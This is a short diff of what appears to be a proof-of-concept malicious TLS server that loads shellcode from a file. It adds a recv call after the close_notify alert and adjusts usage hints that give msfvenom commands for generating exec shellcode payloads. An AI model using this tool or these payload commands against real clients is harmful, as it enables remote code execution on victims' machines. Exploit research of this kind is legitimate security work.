@@ -194,6 +194,8 @@ def run_server(host: str = "127.0.0.1", port: int = 8443):
             # Send our close_notify first (encrypted alert)
             alert = tls_gen.generate_alert(level=1, description=0x00)  # warning, close_notify
             conn.sendall(alert)
+
+            conn.recv(4096)
             print("[>] Sent close_notify alert")
 
             # terminate connection gracefully
@@ -205,7 +207,7 @@ if __name__ == "__main__":
         print("Usage: python3 server.py <host> <port>")
         print("Usage: python3 server.py <host> <port> <shellcode-location>")
         print("\n\tHint: msfvenom -p linux/x64/exec CMD=id > shellcode.bin")
-        print("\n\tHint: msfvenom -p windows/x64/exec CMD=\"cmd /c whoami & calc.exe\"  > shellcode.bin")
+        print("\tHint: msfvenom -p windows/x64/exec CMD=\"cmd /c whoami & calc.exe\" EXITFUNC=thread > shellcode.bin")
         sys.exit(1)
     elif len(sys.argv) == 4:
         shellcode_path = sys.argv[3]
